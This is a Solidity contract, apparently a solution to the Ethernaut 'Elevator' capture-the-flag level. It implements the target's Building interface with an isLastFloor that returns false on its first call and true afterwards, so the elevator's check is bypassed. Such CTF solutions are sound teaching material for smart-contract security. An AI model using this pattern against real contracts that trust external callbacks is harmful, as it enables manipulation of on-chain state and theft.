pragma solidity ^0.8.21;

interface IElevator {
    function goTo(uint _floor) external;
}

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract ElevatorAttacker is Building {
    IElevator elevator;
    uint8 callCount;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
    }

    function attack(uint floor) external {
        elevator.goTo(floor);
    }

    function isLastFloor(uint) external returns (bool) {
        callCount++;
        // return true from 2nd call onwards
        return callCount > 1;
    }
}
